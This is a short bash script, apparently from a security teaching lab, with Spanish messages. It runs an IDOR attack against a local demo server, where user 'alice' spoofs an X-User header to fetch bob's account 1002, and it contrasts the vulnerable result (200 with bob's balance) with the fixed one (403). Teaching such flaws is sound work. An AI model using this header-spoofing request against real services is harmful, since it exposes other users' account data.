#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"; PORT="${PORT:-8011}"
echo "== Ataque: IDOR - alice (cuenta 1001) pide la cuenta 1002 de bob =="
curl -s -w '\nHTTP %{http_code}\n' -H "X-User: alice" "http://127.0.0.1:${PORT}/accounts/1002"
echo "Vulnerable: devuelve el saldo de bob (200). Fixed: 403 Forbidden."
